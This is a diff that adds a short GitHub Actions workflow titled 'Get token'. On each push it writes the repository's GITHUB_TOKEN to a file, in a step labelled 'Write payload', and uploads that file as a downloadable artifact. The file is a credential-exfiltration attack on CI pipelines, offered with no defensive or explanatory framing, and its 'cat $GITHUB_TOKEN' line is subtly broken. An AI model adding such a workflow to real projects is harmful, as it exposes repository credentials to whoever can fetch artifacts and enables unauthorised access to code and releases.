@@ -1,0 +1,17 @@
+name: Get token
+on: push
+
+jobs:
+  test:
+    name: see-token
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Write payload
+      run: | 
+        cat $GITHUB_TOKEN > tok.txt
+    - name: Upload payload
+      uses: actions/upload-artifact@v1
+      with:
+        name: token
+        path: tok.txt
